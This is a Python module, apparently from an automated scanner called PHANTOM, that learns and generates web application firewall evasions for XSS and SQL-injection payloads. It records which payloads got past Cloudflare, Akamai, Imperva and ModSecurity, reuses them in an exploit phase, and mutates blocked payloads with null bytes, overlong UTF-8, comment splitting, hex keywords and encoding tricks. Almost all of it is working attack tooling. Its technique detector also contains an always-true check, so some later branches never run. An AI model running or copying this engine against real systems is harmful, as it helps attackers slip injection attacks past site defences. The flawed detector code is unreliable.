"""
WAF Bypass Intelligence — PHANTOM's WAF Learning Engine

Remembers which payloads successfully bypassed specific WAFs and
automatically uses them in future scans. Learns from every exploit
attempt to build per-WAF bypass profiles.

Integration points:
- _phase_waf: queries known bypasses after WAF detection
- _phase_exploit: records bypass success/failure after each payload attempt
"""
import logging
import random
import re
import urllib.parse
from collections import defaultdict

from sqlalchemy import select, and_
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.knowledge import KnowledgePattern

logger = logging.getLogger(__name__)


class WAFIntelligence:
    """Learns and remembers which payloads bypass specific WAFs."""

    # ------------------------------------------------------------------ #
    # 1. Record bypass results
    # ------------------------------------------------------------------ #

    async def record_bypass(
        self,
        waf_name: str,
        payload: str,
        vuln_type: str,
        success: bool,
        response_code: int,
        db: AsyncSession,
    ):
        """Record whether a payload got through a WAF.

        Called after every exploit attempt when a WAF is present.
        Stores results in KnowledgePattern with pattern_type='waf_bypass'.
        """
        if not waf_name or not payload:
            return

        waf_key = waf_name.lower().strip()

        # Look for an existing record for this exact waf + payload combo
        result = await db.execute(
            select(KnowledgePattern).where(
                and_(
                    KnowledgePattern.pattern_type == "waf_bypass",
                    KnowledgePattern.technology == waf_key,
                    KnowledgePattern.vuln_type == vuln_type,
                )
            )
        )
        patterns = result.scalars().all()

        # Find one whose pattern_data contains this exact payload
        existing = None
        for p in patterns:
            data = p.pattern_data or {}
            if data.get("payload") == payload:
                existing = p
                break

        if existing:
            await self.update_confidence(waf_key, payload, success, db, _pattern=existing)
        elif success:
            # Only create new KB patterns for SUCCESSFUL bypasses
            # Failed attempts are too numerous and create junk patterns
            db.add(KnowledgePattern(
                pattern_type="waf_bypass",
                technology=waf_key,
                vuln_type=vuln_type,
                pattern_data={
                    "payload": payload,
                    "waf": waf_key,
                    "success_count": 1,
                    "fail_count": 0,
                    "total_attempts": 1,
                    "last_response_code": response_code,
                    "success_rate": 1.0,
                },
                confidence=0.6,
                sample_count=1,
            ))

        try:
            await db.flush()
        except Exception as e:
            logger.debug(f"WAFIntelligence record_bypass flush error: {e}")

    # ------------------------------------------------------------------ #
    # 2. Query effective bypasses
    # ------------------------------------------------------------------ #

    async def get_effective_bypasses(
        self,
        waf_name: str,
        vuln_type: str,
        db: AsyncSession,
    ) -> list[str]:
        """Return payloads that previously bypassed this WAF, ordered by confidence.

        Returns raw payload strings ready to inject into the pipeline.
        """
        waf_key = waf_name.lower().strip()

        query = select(KnowledgePattern).where(
            and_(
                KnowledgePattern.pattern_type == "waf_bypass",
                KnowledgePattern.technology == waf_key,
                KnowledgePattern.confidence >= 0.4,
            )
        ).order_by(KnowledgePattern.confidence.desc()).limit(50)

        result = await db.execute(query)
        patterns = result.scalars().all()

        payloads: list[str] = []
        for p in patterns:
            data = p.pattern_data or {}
            # Filter by vuln_type if specified (also include generic)
            p_vtype = p.vuln_type or ""
            if vuln_type and p_vtype and p_vtype != vuln_type and p_vtype != "generic":
                continue

            payload = data.get("payload")
            if payload and isinstance(payload, str) and payload not in payloads:
                payloads.append(payload)

            # Also pull from a payloads list if present (legacy format)
            for pl in data.get("payloads", []):
                pl_str = pl if isinstance(pl, str) else str(pl)
                if pl_str and pl_str not in payloads:
                    payloads.append(pl_str)

        return payloads

    # ------------------------------------------------------------------ #
    # 3. Generate mutations for blocked payloads
    # ------------------------------------------------------------------ #

    def generate_mutations(self, waf_name: str, blocked_payload: str, vuln_type: str = "") -> list[str]:
        """When a payload is blocked, generate mutations that might bypass the WAF.

        Returns a list of mutated payload strings.
        """
        mutations: list[str] = []
        waf_key = (waf_name or "").lower()

        # --- Case variation ---
        case_swapped = self._case_swap(blocked_payload)
        if case_swapped != blocked_payload:
            mutations.append(case_swapped)

        # --- URL encoding ---
        mutations.append(urllib.parse.quote(blocked_payload))

        # --- Double URL encoding ---
        mutations.append(urllib.parse.quote(urllib.parse.quote(blocked_payload)))

        # --- Unicode encoding ---
        mutations.append(self._unicode_encode(blocked_payload))

        # --- Comment injection (HTML) ---
        # <script> -> <scr/**/ipt>
        comment_injected = self._comment_inject_html(blocked_payload)
        if comment_injected != blocked_payload:
            mutations.append(comment_injected)

        # --- Null byte injection ---
        null_injected = self._null_byte_inject(blocked_payload)
        if null_injected != blocked_payload:
            mutations.append(null_injected)

        # --- Attribute tricks for HTML payloads ---
        attr_tricked = self._attribute_tricks(blocked_payload)
        if attr_tricked != blocked_payload:
            mutations.append(attr_tricked)

        # --- Protocol tricks ---
        proto_tricked = self._protocol_tricks(blocked_payload)
        if proto_tricked != blocked_payload:
            mutations.append(proto_tricked)

        # --- SQLi-specific mutations ---
        is_sqli = vuln_type in ("sqli", "sqli_blind", "") and any(
            kw in blocked_payload.upper() for kw in ("UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "OR ", "AND ")
        )
        if is_sqli:
            mutations.extend(self._sqli_mutations(blocked_payload))

        # --- Tab / newline whitespace substitution ---
        if " " in blocked_payload:
            mutations.append(blocked_payload.replace(" ", "%09"))  # tab
            mutations.append(blocked_payload.replace(" ", "%0a"))  # newline

        # --- WAF-specific mutations ---
        if "cloudflare" in waf_key:
            # Cloudflare is weak against double encoding + unicode normalization
            mutations.append(self._overlong_utf8(blocked_payload))
        elif "akamai" in waf_key:
            # Akamai: null bytes + chunked
            mutations.append(blocked_payload.replace(" ", "%00"))
            mutations.append("%0d%0a".join(blocked_payload[i:i + 3] for i in range(0, len(blocked_payload), 3)))
        elif "imperva" in waf_key or "incapsula" in waf_key:
            # Imperva: chunk split + tab substitution
            mutations.append("%0d%0a".join(blocked_payload[i:i + 4] for i in range(0, len(blocked_payload), 4)))
        elif "modsecurity" in waf_key:
            # ModSecurity: overlong UTF-8 + backslash tricks
            mutations.append(self._overlong_utf8(blocked_payload))
            mutations.append(blocked_payload.replace("'", "\\'").replace('"', '\\"'))

        # Deduplicate while preserving order, skip if identical to original
        seen = {blocked_payload}
        unique: list[str] = []
        for m in mutations:
            if m and m not in seen:
                seen.add(m)
                unique.append(m)

        return unique

    # ------------------------------------------------------------------ #
    # 4. Update confidence
    # ------------------------------------------------------------------ #

    async def update_confidence(
        self,
        waf_name: str,
        payload: str,
        success: bool,
        db: AsyncSession,
        _pattern: KnowledgePattern | None = None,
    ):
        """Increment or decrement confidence score for a waf+payload combo."""
        pattern = _pattern
        if pattern is None:
            waf_key = waf_name.lower().strip()
            result = await db.execute(
                select(KnowledgePattern).where(
                    and_(
                        KnowledgePattern.pattern_type == "waf_bypass",
                        KnowledgePattern.technology == waf_key,
                    )
                )
            )
            candidates = result.scalars().all()
            for c in candidates:
                if (c.pattern_data or {}).get("payload") == payload:
                    pattern = c
                    break

        if not pattern:
            return

        data = pattern.pattern_data or {}
        success_count = data.get("success_count", 0)
        fail_count = data.get("fail_count", 0)
        total = data.get("total_attempts", success_count + fail_count)

        if success:
            success_count += 1
        else:
            fail_count += 1
        total += 1

        success_rate = success_count / total if total > 0 else 0.0

        # Confidence formula: base 0.3 + up to 0.65 from success rate, capped at 0.95
        # Also factor in sample size — more samples = more confident
        sample_bonus = min(0.15, total * 0.01)
        new_confidence = min(0.95, 0.3 + (success_rate * 0.5) + sample_bonus)

        # If consistently failing (>5 attempts, <10% success), drop confidence hard
        if total >= 5 and success_rate < 0.1:
            new_confidence = max(0.05, new_confidence - 0.2)

        pattern.pattern_data = {
            **data,
            "success_count": success_count,
            "fail_count": fail_count,
            "total_attempts": total,
            "success_rate": round(success_rate, 4),
        }
        pattern.confidence = round(new_confidence, 4)
        pattern.sample_count = total

    # ------------------------------------------------------------------ #
    # 5. WAF profile
    # ------------------------------------------------------------------ #

    async def get_waf_profile(self, waf_name: str, db: AsyncSession) -> dict:
        """Return a profile of the WAF: what it blocks, what it allows, known bypass techniques.

        Useful for the AI analysis phase and human review.
        """
        waf_key = waf_name.lower().strip()

        result = await db.execute(
            select(KnowledgePattern).where(
                and_(
                    KnowledgePattern.pattern_type == "waf_bypass",
                    KnowledgePattern.technology == waf_key,
                )
            ).order_by(KnowledgePattern.confidence.desc())
        )
        patterns = result.scalars().all()

        if not patterns:
            return {
                "waf_name": waf_name,
                "total_attempts": 0,
                "known_bypasses": [],
                "blocked_patterns": [],
                "bypass_techniques": [],
                "vuln_type_stats": {},
                "overall_bypass_rate": 0.0,
            }

        known_bypasses: list[dict] = []
        blocked_patterns: list[dict] = []
        technique_counts: dict[str, int] = defaultdict(int)
        vuln_type_stats: dict[str, dict] = defaultdict(lambda: {"success": 0, "fail": 0})
        total_success = 0
        total_fail = 0

        for p in patterns:
            data = p.pattern_data or {}
            payload = data.get("payload", "")
            sc = data.get("success_count", 0)
            fc = data.get("fail_count", 0)
            sr = data.get("success_rate", 0.0)
            vt = p.vuln_type or "unknown"

            total_success += sc
            total_fail += fc
            vuln_type_stats[vt]["success"] += sc
            vuln_type_stats[vt]["fail"] += fc

            entry = {
                "payload": payload[:200],
                "vuln_type": vt,
                "success_rate": sr,
                "attempts": data.get("total_attempts", sc + fc),
                "confidence": p.confidence,
            }

            if p.confidence >= 0.4 and sr > 0.3:
                known_bypasses.append(entry)
                # Detect technique from payload characteristics
                technique = self._detect_technique(payload)
                if technique:
                    technique_counts[technique] += 1
            else:
                blocked_patterns.append(entry)

        total_attempts = total_success + total_fail
        overall_bypass_rate = total_success / total_attempts if total_attempts > 0 else 0.0

        # Sort techniques by frequency
        bypass_techniques = sorted(
            [{"technique": t, "count": c} for t, c in technique_counts.items()],
            key=lambda x: x["count"],
            reverse=True,
        )

        return {
            "waf_name": waf_name,
            "total_attempts": total_attempts,
            "overall_bypass_rate": round(overall_bypass_rate, 4),
            "known_bypasses": known_bypasses[:20],
            "blocked_patterns": blocked_patterns[:20],
            "bypass_techniques": bypass_techniques,
            "vuln_type_stats": {
                vt: {
                    "success": s["success"],
                    "fail": s["fail"],
                    "rate": round(s["success"] / (s["success"] + s["fail"]), 4)
                    if (s["success"] + s["fail"]) > 0 else 0.0,
                }
                for vt, s in vuln_type_stats.items()
            },
        }

    # ================================================================== #
    # Private helpers — mutation primitives
    # ================================================================== #

    @staticmethod
    def _case_swap(payload: str) -> str:
        return "".join(
            c.upper() if random.random() > 0.5 else c.lower()
            if c.isalpha() else c
            for c in payload
        )

    @staticmethod
    def _unicode_encode(payload: str) -> str:
        result = ""
        for char in payload:
            if char.isalpha():
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result

    @staticmethod
    def _comment_inject_html(payload: str) -> str:
        """Insert HTML comments to break up tag names: <script> -> <scr/**/ipt>"""
        # Break up known tags
        replacements = {
            "<script": "<scr/**/ipt",
            "</script": "</scr/**/ipt",
            "onerror": "on/**/error",
            "onload": "on/**/load",
            "onmouseover": "on/**/mouseover",
            "onfocus": "on/**/focus",
            "onclick": "on/**/click",
        }
        result = payload
        for old, new in replacements.items():
            result = re.sub(re.escape(old), new, result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def _null_byte_inject(payload: str) -> str:
        """Insert null bytes to confuse WAF parsers: <script> -> <scr%00ipt>"""
        result = payload
        # Insert null byte in the middle of dangerous tags/keywords
        for tag in ("script", "iframe", "object", "embed", "UNION", "SELECT"):
            if tag.lower() in result.lower():
                mid = len(tag) // 2
                pattern = re.compile(re.escape(tag), re.IGNORECASE)
                match = pattern.search(result)
                if match:
                    matched = match.group()
                    replacement = matched[:mid] + "%00" + matched[mid:]
                    result = result[:match.start()] + replacement + result[match.end():]
        return result

    @staticmethod
    def _attribute_tricks(payload: str) -> str:
        """Replace spaces with / in HTML attributes: <img src=x onerror=...> -> <img/src=x/onerror=...>"""
        # Only apply to HTML-like payloads
        if "<" not in payload:
            return payload
        # Replace space before known attributes with /
        result = re.sub(r'\s+(src|href|onerror|onload|onfocus|onclick|onmouseover)=',
                        r'/\1=', payload, flags=re.IGNORECASE)
        return result

    @staticmethod
    def _protocol_tricks(payload: str) -> str:
        """Bypass protocol filters: javascript: -> java%0ascript:"""
        result = payload
        replacements = {
            "javascript:": "java%0ascript:",
            "vbscript:": "vb%0ascript:",
            "data:": "da%09ta:",
        }
        for old, new in replacements.items():
            result = re.sub(re.escape(old), new, result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def _sqli_mutations(payload: str) -> list[str]:
        """Generate SQLi-specific bypass mutations."""
        mutations = []
        upper = payload.upper()

        # Case variation for SQL keywords
        case_varied = payload
        for kw in ("UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE"):
            if kw in upper:
                # UnIoN style
                mixed = "".join(
                    c.upper() if i % 2 == 0 else c.lower()
                    for i, c in enumerate(kw)
                )
                case_varied = re.sub(kw, mixed, case_varied, flags=re.IGNORECASE)
        if case_varied != payload:
            mutations.append(case_varied)

        # MySQL inline comment bypass: UNION -> /*!UNION*/
        comment_bypass = payload
        for kw in ("UNION", "SELECT", "FROM", "WHERE", "AND", "OR"):
            comment_bypass = re.sub(
                rf"\b({kw})\b",
                rf"/*!{kw}*/",
                comment_bypass,
                flags=re.IGNORECASE,
            )
        if comment_bypass != payload:
            mutations.append(comment_bypass)

        # Hex-encoded keyword bypass: UNION -> UN%49ON
        hex_map = {
            "UNION": "UN%49ON",
            "SELECT": "SE%4CECT",
            "FROM": "FR%4FM",
            "WHERE": "WH%45RE",
            "AND": "AN%44",
        }
        hex_bypass = payload
        for kw, replacement in hex_map.items():
            hex_bypass = re.sub(kw, replacement, hex_bypass, flags=re.IGNORECASE)
        if hex_bypass != payload:
            mutations.append(hex_bypass)

        # SQL comment between keyword characters: UNION -> U/**/N/**/I/**/O/**/N
        for kw in ("UNION", "SELECT"):
            if kw in upper:
                commented = "/**/".join(kw)
                mutations.append(re.sub(kw, commented, payload, flags=re.IGNORECASE))

        return mutations

    @staticmethod
    def _overlong_utf8(payload: str) -> str:
        """Overlong UTF-8 encoding to bypass character-based WAF filters."""
        result = ""
        for char in payload:
            if char == "<":
                result += "%c0%bc"
            elif char == ">":
                result += "%c0%be"
            elif char == "'":
                result += "%c0%a7"
            elif char == '"':
                result += "%c0%a2"
            else:
                result += char
        return result

    @staticmethod
    def _detect_technique(payload: str) -> str | None:
        """Detect which bypass technique a payload uses."""
        if "/**/" in payload:
            return "comment_injection"
        if "%00" in payload:
            return "null_byte"
        if "%0a" in payload.lower() or "%0d" in payload.lower():
            return "newline_injection"
        if "%09" in payload:
            return "tab_substitution"
        if "\\u" in payload:
            return "unicode_encoding"
        if "%25" in payload:
            return "double_url_encoding"
        if "%c0" in payload.lower():
            return "overlong_utf8"
        if "/*!":
            return "mysql_inline_comment"
        # Mixed case detection
        alpha_chars = [c for c in payload if c.isalpha()]
        if alpha_chars:
            has_upper = any(c.isupper() for c in alpha_chars)
            has_lower = any(c.islower() for c in alpha_chars)
            if has_upper and has_lower:
                # Check for intentional mixed case in keywords
                for kw in ("script", "union", "select"):
                    match = re.search(kw, payload, re.IGNORECASE)
                    if match:
                        found = match.group()
                        if found != found.lower() and found != found.upper():
                            return "case_variation"
        if "/" in payload and "<" in payload:
            # Check for attribute slash trick: <img/src=
            if re.search(r"<\w+/\w+=", payload):
                return "attribute_slash"
        return None
